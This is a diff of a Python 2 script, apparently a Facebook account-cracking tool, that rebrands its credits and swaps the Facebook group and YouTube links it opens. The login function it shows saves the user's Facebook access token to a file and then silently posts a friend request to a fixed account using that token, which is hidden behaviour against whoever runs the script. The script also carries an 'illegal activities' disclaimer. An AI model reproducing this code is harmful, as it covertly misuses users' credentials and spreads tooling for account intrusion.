@@ -112,7 +112,7 @@ jalan(" -----")
  
 jalan("\033[1;91m Do everything on your own risk.")	
 jalan("\033[1;93m I'm not responsible for any illegal activities.")
-jalan("                                          ---\033[1;92m𝕊𝕒𝕜𝕙𝕒𝕨𝕒𝕥")	
+jalan("                                          ---\033[1;92mNoMaN")	
 
 jalan("\033[1;93m To get any help join our Facebook Group \033[1;96m(Cyber-39).")
 
@@ -132,7 +132,7 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong!,\033[1;92mjoin our FB Group to get the correct password"
-            os.system('xdg-open https://facebook.com/groups/cyberzone360')
+            os.system('xdg-open https://www.facebook.com/groups/155073338414040/?ref=share')
 
     else:
         print "\033[1;91mWrong!,\033[1;92mjoin our FB Group to get the correct username"
@@ -180,8 +180,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful.Please subscribe my Channel(TiPS&TRiCKS 360)'
-				os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
+				print '\n\x1b[1;36;40m[✓] Login Successful.Please subscribe my Channel(Noman Official)'
+				os.system('xdg-open https://www.facebook.com/groups/155073338414040/?ref=share')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
